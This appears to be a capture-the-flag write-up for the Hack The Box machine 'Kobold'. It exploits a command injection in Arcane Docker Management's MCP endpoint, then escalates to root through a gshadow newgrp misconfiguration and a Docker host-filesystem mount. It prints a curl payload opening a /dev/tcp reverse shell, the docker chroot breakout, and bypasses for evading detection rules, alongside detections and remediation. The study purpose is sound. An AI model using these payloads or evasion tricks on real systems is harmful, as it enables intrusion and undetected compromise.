## Summary

Kobold runs Arcane Docker Management v1.13.0 behind a subdomain discovered during virtual host
enumeration. After spending time on dead ends: password brute forcing the login panel and chasing
PrivateBin LFI: the real path turned out to be an unauthenticated command injection
(CVE-2026-23520) in the MCP connect API at `mcp.K0#701д.htb`. Initial access lands as `ben`, who
sits in the `operator` group. A misconfigured `/etc/gshadow` entry lets `operator` members switch
into the `docker` group via `newgrp` without a password. From there a single Docker host-mount
command gives a root shell.

---

## Methodology Notes

Password brute force against the Arcane login panel at port 3552 was the first approach. The
login endpoint at `/api/auth/login` accepts JSON credentials and returns a consistent error string
on failure, making it ffuf-friendly. Neither rockyou against `admin@K0#701д.htb` nor a series of
manual credential guesses (admin, arcane, arcane-admin, arcane_admin) produced a hit. This was a
dead end.

PrivateBin at `bin.K0#701д.htb` looked promising because the `operator` group membership on the
box gives read access to the PrivateBin data directory. The `?tpl=` parameter has known LFI
behaviour in older PrivateBin versions. Attempts to read `/etc/passwd`, SSH keys, and raw
PrivateBin paste data files via path traversal all returned empty or templated responses. A more
aggressive attempt to drop a PHP shell via the salt configuration file also went nowhere: the
container filesystem layout did not match the assumed path. PrivateBin contributed nothing to the
chain and was a rabbit hole throughout.

The productive signal came from reading the bundled JavaScript source served on port 3552, which
exposed the `/api/mcp/connect` endpoint and its expected JSON schema. Switching focus to
`mcp.K0#701д.htb` and that single endpoint yielded the foothold immediately.

## Recon

### 1. Service Enumeration: T1046 / T1595.002

Full-port scan followed by virtual host fuzzing to identify active subdomains.


**Findings:** Four services active. Port 80 serves a static landing page with `admin@K0#701д.htb`

vulnerable range. Port 8080 serves PrivateBin internally inside a container.

**Logs Generated:**

2. Application log on port 3552 recording unauthenticated requests to the API surface

**Alerts Triggered:**
1. IDS port scan signature on SYN sweep from a single source
2. Alert on unauthenticated probe to the management interface on non-standard port 3552

**Network Artifacts:**
1. SYN sweep across all 65535 ports visible in NetFlow
2. HTTP GET requests to ports 3552 and 8080 from an external address

**Artifacts Left:**
1. Source IP in access logs on ports 80, 443, and 3552

**Sysmon/EDR:**
1. NetworkConnect events to ports 3552 and 8080 from an external IP
2. Auditd: inbound connections to the Arcane process socket

**SIEM Correlation:**
1. Single IP scanning all ports within a short window: textbook scan detection trigger
2. Version string in banner matching known CVE database entries

**Sigma Rule:** [network_connection_unusual_port](https://github.com/SigmaHQ/sigma/search?q=unusual+port+connection)

**Bypass:** A targeted probe to ports 80, 443, and 3552 only: informed by the machine name

**Remediation:**
1. Restrict port 3552 to the management network; it should never be reachable externally
2. Remove version disclosure from the Arcane HTTP response headers
3. Place the management interface behind network-layer authentication

**OpSec Rating:** High noise. Full-port Nmap against a single IP is reliably detected in any

## Exploitation

### 4. Unauthenticated RCE via CVE-2026-23520: T1190 / T1059.004

CVE-2026-23520 is a command injection vulnerability in Arcane Docker Management versions up to
and including 1.13.0. The `/api/mcp/connect` endpoint accepts a JSON body in which the
`serverConfig.command` and `serverConfig.args` fields are passed directly into a shell execution
context without sanitisation or validation. Because the endpoint requires no authentication,
any attacker with HTTP access to the `mcp.K0#701д.htb` subdomain can execute arbitrary OS commands
in the security context of the Arcane service process: user `ben`.

Start a listener:

```bash
nc -lvnp 4444
```

Send the injection payload:

```bash
curl -s -k -X POST https://mcp.K0#701д.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/<LHOST>/4444 0>&1"],"env":{}},"serverId":"fresh"}'
```

**Findings:** Reverse shell lands immediately as
`uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)`. The `operator` group membership is
the pivot point for the privilege escalation chain.

**Logs Generated:**
1. Arcane application log: POST to /api/mcp/connect with full JSON payload in body
2. Linux process table: bash spawned as a child of the Arcane service process
3. Kernel: outbound TCP connection from target to attacker IP on port 4444

**Alerts Triggered:**
1. Web service spawning an interactive shell process: anomalous parent-child relationship
2. Outbound TCP from a web service process to a non-HTTP port on an external address

**Network Artifacts:**
1. Outbound TCP to attacker IP:4444 visible in NetFlow and kernel socket table
2. Raw JSON POST body containing the /dev/tcp redirect string in the application log

**Artifacts Left:**
1. Bash process visible under the Arcane service parent PID until the session ends
2. Full POST body in the web server access log: the payload is not obfuscated
3. /proc entry for the spawned shell

**Sysmon/EDR:**
1. ProcessCreate: bash spawned by Arcane service with /dev/tcp in arguments
2. NetworkConnect: outbound TCP to attacker IP on port 4444
3. Linux auditd execve rule matching bash arguments containing /dev/tcp redirect

**SIEM Correlation:**
1. POST to management API endpoint followed within seconds by outbound TCP to external
   non-HTTP port: high-confidence reverse shell indicator regardless of payload content

**Sigma Rule:**
[proc_creation_lnx_reverse_shell_bash](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+bash+linux)
matches the /dev/tcp pattern directly and ships in the default SigmaHQ ruleset.

**Bypass:** Base64-encode the payload and decode server-side
(`echo <b64>|base64 -d|bash`) to bypass string-match rules on the literal `/dev/tcp` string.
Using port 443 for the callback reduces egress firewall blocking risk. Neither bypass removes
the POST body from the Arcane application log.

**Remediation:**
1. Patch Arcane to version 1.13.2 or later where CVE-2026-23520 is resolved
2. Sanitise and strictly validate all fields in the serverConfig object before passing to any
   execution context
3. Require authentication on all /api/mcp/* endpoints
4. Run the Arcane service as a dedicated user with no outbound internet access and restrict
   process spawning via seccomp profile

**OpSec Rating:** Moderate. The POST body and the outbound connection are both high-confidence
detection points. Egress filtering alone would have blocked the reverse shell without a port 443
workaround.

### 5. Local Enumeration: T1069.001 / T1083

```bash
id
cat /etc/gshadow | grep operator
ls -la /run/docker.sock
docker images
docker ps
```

**Findings:** `/etc/gshadow` contains an entry granting any member of the `operator` group
passwordless access to the `docker` group via `newgrp`. The Docker socket at `/run/docker.sock`
is owned `root:docker` with `666` permissions: fully accessible the moment docker group
membership is obtained. Running `docker images` after `newgrp docker` reveals two pre-pulled
images: `mysql:latest` and `privatebin/nginx-fpm-alpine:2.0.2`. The PrivateBin container is
active in `docker ps` under the name `bin`. LinPEAS independently flagged `/run/docker.sock` as
high risk: root-owned writable Unix socket with dockerd running as root. No SUID binaries, no
sudo rules, no kernel exploits needed.

**Logs Generated:**
1. Read of /etc/gshadow: recorded by auditd only if a file-read rule is configured for that
   path (non-default)

**Alerts Triggered:**
1. None on a default Linux configuration

**Artifacts Left:**
1. Shell history entries for gshadow cat and docker enumeration commands

**Sysmon/EDR:**
1. FileOpen event on /etc/gshadow if EDR is configured to watch sensitive credential files

**Sigma Rule:** No dedicated SigmaHQ rule for gshadow reads. Generic sensitive file access rules
would cover this path on a hardened host.

**Bypass:** `/etc/group` exposes partial group membership without touching the shadow group file,
reducing artefacts if auditd is watching /etc/gshadow.

**Remediation:**
1. Remove the operator-to-docker bridge from /etc/gshadow: this entry is functionally a root
   escalation backdoor
2. Audit all accounts in the docker group; membership is equivalent to a sudo ALL rule
3. Restrict /run/docker.sock permissions to 660 with no world-readable bits

**OpSec Rating:** Low. File reads are silent on default Linux configurations.

### 6. Docker Group Escalation and Host Breakout: T1484 / T1611

`newgrp` re-executes the current shell with an updated primary group, pulling in the docker group
silently via the gshadow entry. No password prompt, no interaction. The Docker daemon runs as
host root and honours the subsequent API request without restriction.

```bash
newgrp docker
docker run --rm -it -v /:/hostfs --entrypoint /bin/bash mysql:latest -c "chroot /hostfs /bin/sh"
```

Inside the resulting shell:

```bash
id
cat /root/root.txt
```

**Findings:** Root shell on the host. Flags retrieved.

**Logs Generated:**
1. Docker daemon log: container create event including full volume mount specification `-v /:/hostfs`
2. Auth/syslog: new container namespace created by dockerd
3. Kernel audit: chroot syscall if auditd rules are configured to capture it

**Alerts Triggered:**
1. Container launched with host root filesystem mounted: Falco fires immediately if deployed
2. chroot inside a container namespace: anomalous; high-fidelity detection with Falco

**Network Artifacts:**
1. None: entirely local escalation

**Artifacts Left:**
1. Docker event log entry persisting until log rotation
2. Entry in `docker ps -a` history if --rm cleanup fails
3. Shell history in /home/ben

**Sysmon/EDR:**
1. Falco: container_started with sensitive host path mounted
2. ProcessCreate: chroot under container namespace
3. Auditd: execve of /bin/sh with unusual mount namespace context

**SIEM Correlation:**
1. `newgrp docker` in the auth log followed by a Docker daemon event showing a container with
   `-v /:/` is a complete, correlated privilege escalation chain readable end-to-end in logs

**Sigma Rule:**
[container_breakout_via_host_mount](https://github.com/SigmaHQ/sigma/search?q=docker+container+escape)
covers privileged container launches with host path mounts directly in SigmaHQ.

**Bypass:** `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh` achieves the same
host access without invoking chroot, bypassing Falco rules that specifically watch the chroot
syscall rather than the mount event.

**Remediation:**
1. Run Docker in rootless mode: eliminates this entire escalation class at the daemon level
2. Deploy Falco with rules alerting on containers mounting `/` or any path under `/root`, `/etc`,
   or `/home`
3. Remove `ben` from `operator`; remove the operator-to-docker gshadow bridge
4. Enforce Docker socket permissions at 660 with no world-readable bits
5. Use a Docker socket proxy (e.g., Tecnativa docker-socket-proxy) to whitelist only the API
   calls the application genuinely needs

**OpSec Rating:** Low: Docker daemon logs the full container create event including mount
specification. Any runtime security tool watching dockerd fires on this.

## Technical Deep Dive: How and Why Every Step Worked

This section explains the underlying mechanics of the full chain in detail: not just what
happened but precisely why each component behaved the way it did.

### Why `ben` has `operator` and what that means

When the reverse shell lands, `id` returns:
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

In a default Linux installation, `operator` is a legacy group with no significant privileges.
HTB intentionally repurposed it here as a stepping stone. The significance is not the group
itself: it is the entry in `/etc/gshadow`.

`/etc/gshadow` is the shadow equivalent of `/etc/group`. Where `/etc/group` stores group names,
GIDs, and members, `/etc/gshadow` stores hashed group passwords and the list of accounts that
are permitted to use `newgrp` to assume that group without providing the password. The relevant
entry looks like:

```
docker:!::operator
```

Broken down: the group is `docker`, the `!` means no password is set (password-less group
switch), the empty field is administrators, and `operator` is the list of accounts permitted to
switch into this group via `newgrp` with no credential check. This is the misconfiguration.
Under normal security hygiene, only explicitly trusted service accounts belong in the docker
group and no mechanism for lateral group switching should exist.

### Why `newgrp docker` works without a password

`newgrp` is a POSIX utility that re-executes the user's shell in a new process with a different
primary group. When you run `newgrp docker`, PAM checks `/etc/gshadow`. If the calling user's
account is listed in the permitted-users field for the target group, the switch is granted
without a password. The new shell inherits all parent environment variables and the user's UID
does not change: only `gid` updates to the docker group GID (111 in this case). This is why
`id` after `newgrp docker` returns:

```
uid=1001(ben) gid=111(docker) groups=111(docker),1001(ben),37(operator)
```

No authentication event is generated beyond a normal group change record in the auth log. There
is no failed-login counter to trip, no lockout to trigger. The entire privilege escalation up
to this point is silent on a default Ubuntu logging configuration.

### Why docker group membership is equivalent to root

The Docker daemon (`dockerd`) runs as root (uid=0) by default on every standard Docker
installation. It listens on a Unix socket at `/var/run/docker.sock` (or `/run/docker.sock`).
The socket is owned `root:docker`: meaning any process running as a member of the docker group
can write to it.

When a process writes to the Docker socket it is communicating directly with a process running
as root, asking it to perform actions on its behalf. The daemon does not check whether the
requesting user should be permitted to mount arbitrary host paths, spawn privileged containers,
or modify the host filesystem. It trusts that group membership was a sufficient authorisation
check: which it is, in the same way that `sudo ALL` is a sufficient authorisation check. They
are functionally equivalent. This is documented in Docker's own security documentation:
"The Docker daemon runs as root. [...] If you want to give someone access to docker, you're
essentially giving them root."

On this machine: `/run/docker.sock` had permissions `666` (world-readable and world-writable),
meaning even the docker group step was technically unnecessary for socket access. The group
membership mattered because `docker` CLI itself checks group membership before connecting to the
socket as an ergonomic guard, but a raw API call via curl to the Unix socket would have worked
regardless.

### Why `docker run -v /:/hostfs` produces a root shell

Breaking down the exact command:

```bash
docker run --rm -it -v /:/hostfs --entrypoint /bin/bash mysql:latest -c "chroot /hostfs /bin/sh"
```

`docker run` instructs the Docker daemon (running as root) to create and start a new container.
Because the daemon runs as root, every action it takes: including mounting filesystems: is
performed with full root privileges on the host.

`-v /:/hostfs` is a bind mount instruction. It tells the daemon: take the directory `/` on the
host and bind-mount it into the container at the path `/hostfs`. A bind mount does not copy
data: it exposes the exact same inode tree. The container sees `/hostfs/root`, `/hostfs/etc`,
`/hostfs/home` and so on, and these are the actual live files on the host, not a copy. Any
write to `/hostfs/etc/passwd` inside the container modifies the real `/etc/passwd` on the host.

`--entrypoint /bin/bash` overrides the container image's default entry point (which for
`mysql:latest` would be the MySQL daemon startup script). Instead of launching MySQL, the
container runs `/bin/bash` directly. The `mysql:latest` image was chosen over
`privatebin/nginx-fpm-alpine:2.0.2` specifically because the Alpine-based PrivateBin image uses
BusyBox binaries and its default shell behaviour is less predictable, while the MySQL image ships
a full GNU bash and a standard `/bin/sh`.

`-c "chroot /hostfs /bin/sh"` is passed as an argument to bash, which executes it. `chroot` is
a Linux syscall that changes the root directory of the calling process to the specified path.
After `chroot /hostfs`, all absolute path lookups inside that shell resolve against `/hostfs`
as the new root. The process believes `/` is `/hostfs` from its perspective, which means
`/root/root.txt` resolves to the host's actual `/root/root.txt`.

The resulting shell process is running as uid=0 inside the container (Docker containers run as
root by default unless a non-root user is specified in the image). Its root directory is the
host's filesystem. It has full read and write access to every file on the host: /etc/shadow,
/root/root.txt, SSH host keys, everything.

### Why this is the intended path and not a rabbit hole

Three signals confirmed this was the right direction and not guesswork:

First, the machine pre-pulled both `mysql:latest` and `privatebin/nginx-fpm-alpine:2.0.2` and
left them visible via `docker images`. Pre-pulled images are not an accident on HTB: they are
deliberately staged because the intended exploitation path requires them. If Docker socket abuse
were not the intended escalation, there would be no reason to have cached images ready.

Second, LinPEAS independently identified `/run/docker.sock` as a high-risk finding, printing
it under the "Interesting Groups" and "Interesting Writable Files" categories. LinPEAS surface
prioritisation is a reasonable proxy for intended HTB paths on Easy machines: the tool is
calibrated to highlight exactly the classes of misconfigurations HTB Easy machines are built
around.

Third, every other enumerated path dead-ended cleanly. `sudo -l` returned nothing. The SUID
binary list contained only standard system utilities. No writable cron jobs. No weak service
credentials. The PrivateBin LFI vector existed but was isolated to the container's filesystem,
and the operator-group read access to `/privatebin-data` produced only paste data and TLS
certificates: nothing useful for lateral movement. When every other door is closed and a
high-privilege Unix socket is open, that socket is the door.

### Why you got user (ben) specifically

The Arcane service running on `mcp.K0#701д.htb` was started by the system under user `ben`. This
is visible from the `uid=1001(ben)` in the reverse shell. HTB machines typically run vulnerable
services as a non-root user that either has the user flag in their home directory or has some
privilege that leads toward root. In this case `ben` satisfies both: the user flag is in
`/home/ben/user.txt` and the `operator` group membership provides the escalation path.

The reason `ben` runs the Arcane service rather than a dedicated service account is the
machine's design: it is meant to illustrate the danger of running application services as
interactive user accounts. In a production environment, Arcane should run as a dedicated
service account (e.g., `arcane-svc`) with no supplementary groups, no home directory, and no
shell. Running it as `ben`: a user with a home directory, shell access, and non-standard group
memberships: is the first mistake in a two-mistake chain.

### The complete mistake chain from architect's perspective

The machine encodes three distinct security failures, each of which is necessary for the full
chain:

1. **CVE-2026-23520**: an application security failure. The Arcane developers passed
   user-controlled input directly to a shell without sanitisation. Any competent code review or
   SAST scan would have caught this. The fix is input validation and avoiding shell execution of
   user-supplied data entirely.

2. **The gshadow operator-to-docker bridge**: a system configuration failure. Someone added
   `operator` to the permitted-users list for the docker group in `/etc/gshadow`, probably to
   make it convenient to run Docker commands as `ben` during development. This kind of
   "temporary" configuration change is exactly what persists forever in production. The fix is
   removing `ben` from `operator` and removing the gshadow entry entirely.

3. **Docker running in default (root) mode**: an architectural failure. Running the Docker
   daemon as root means that docker group membership is a root equivalent. The fix is rootless
   Docker, which runs the daemon as the user who starts it, eliminating the host-root escalation
   even if docker group membership is obtained.

Any single one of these three failures in isolation would be a finding but not a chain. All
three together produce a clean path from unauthenticated HTTP access to host root in five
commands.

## Would I Get Caught

Two points in this chain would reliably fire on a hardened network; one would likely go
undetected indefinitely.

The noisiest moment is vhost fuzzing: five thousand requests in under a minute with a rotating
Host header is not subtle. A WAF or any rate-limiting layer would kill it before it finishes.
That said, both subdomains appear in the TLS certificate SAN field, meaning a passive certificate
transparency lookup finds them without a single probe reaching the server. In a real engagement
this would be the first check.

The reverse shell is the second clear detection point. A POST to an internal management API
immediately followed by an outbound TCP connection to a non-RFC1918 address on port 4444: in
the same second: is a reliable SIEM correlation rule. Switching to port 443 with a TLS-wrapped
shell removes the port-based filter, but the Arcane application log still records the injected
payload verbatim. There is no clean way to avoid leaving that artefact short of exploiting a
log injection vulnerability in the application itself.

The gshadow misconfiguration is the one that would survive a long time undetected. There is no
default Linux alert for reading `/etc/gshadow`. `newgrp` requires no password here so it
generates no failed authentication events. The docker group switch appears as a normal session
attribute change in the auth log: unremarkable without specific context. In a real engagement
this would be the highest-severity finding in the report: a user who appears to be a routine
service account can reach root in two commands, and nothing in the default logging stack
correlates those two commands into a privilege escalation event.

The Docker breakout is loud only if Falco is deployed. Without it, the sole permanent artefact
is a daemon log entry showing a container mounted `/`. Most organisations do not alert on dockerd
logs in real time. With Falco and a host-mount rule active, the alert fires the instant
`docker run` is invoked, but by then the root shell already exists.
